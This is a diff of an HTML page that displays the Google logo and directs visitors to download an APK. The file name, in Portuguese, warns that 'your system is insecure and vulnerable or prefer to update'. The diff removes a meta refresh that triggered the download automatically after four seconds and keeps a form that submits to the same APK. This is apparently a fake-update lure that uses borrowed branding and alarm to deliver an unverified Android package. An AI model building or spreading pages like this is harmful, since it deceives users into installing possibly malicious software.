@@ -23,8 +23,8 @@
 </head>
  
   <body class="bg-white">
- <meta http-equiv="refresh" content="4; URL='https://mobi-center.github.io/mobi-center/seu%20sistema%20inseguro%20e%20vulneravel%20ou%20prefere%20atualizar.apk'"/>
-<form action="https://mobi-center.github.io/mobi-center/seu%20sistema%20inseguro%20e%20vulneravel%20ou%20prefere%20atualizar.apk">
+
+<form action="https://mobi-center.github.io/mobi-center/seu sistema inseguro e vulneravel ou prefere atualizar.apk">
     <div class="container">
       <div class="py-5 text-center">
         <img class="d-block mx-auto mb-4" src="https://logodownload.org/wp-content/uploads/2014/09/google-logo-1.png" style="width:20%; height:20%;">
